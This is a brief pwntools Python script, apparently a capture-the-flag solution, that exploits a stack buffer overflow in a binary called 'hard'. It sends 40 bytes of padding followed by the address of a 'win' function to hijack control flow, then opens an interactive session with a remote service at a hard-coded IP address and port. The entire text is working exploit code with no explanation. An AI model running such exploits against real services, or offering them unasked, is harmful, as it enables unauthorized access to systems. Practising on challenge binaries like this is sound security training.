from pwn import *
p=process("./hard")
p=remote("103.47.224.217", 7001)
e=ELF("./hard")
pay=b"A"*40 #padding
pay+=p64(e.sym.win+1) #win function
p.sendline(pay)
p.interactive()